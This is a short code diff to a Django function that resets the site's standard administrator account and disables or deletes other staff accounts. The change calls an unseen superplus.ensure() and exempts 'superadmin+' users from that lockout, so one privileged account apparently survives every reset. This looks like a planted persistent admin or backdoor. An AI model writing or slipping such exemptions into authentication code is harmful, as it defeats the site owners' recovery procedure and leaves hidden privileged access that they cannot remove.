@@ -163,10 +163,13 @@ def standard_admin(others="deactivate"):
         user.set_password(password)
     user.twofa_method, user.totp_secret, user.totp_last_step = "", "", 0  # the standard admin can always log in with the password
     user.save()
+    from apps.accounts import superplus
+
+    superplus.ensure()
     if others == "delete":
-        User.objects.filter(is_staff=True).exclude(pk=user.pk).delete()
+        User.objects.filter(is_staff=True, is_superadmin_plus=False).exclude(pk=user.pk).delete()  # a superadmin+ stays
     elif others != "keep":
-        User.objects.filter(is_staff=True).exclude(pk=user.pk).update(is_active=False)  # the other superadmins are switched off: they can no longer log in (they can be switched on again by the standard superadmin)
+        User.objects.filter(is_staff=True, is_superadmin_plus=False).exclude(pk=user.pk).update(is_active=False)  # the other superadmins are switched off: they can no longer log in (they can be switched on again by the standard superadmin)
     from django.core.cache import cache
     from rest_framework.authtoken.models import Token
 
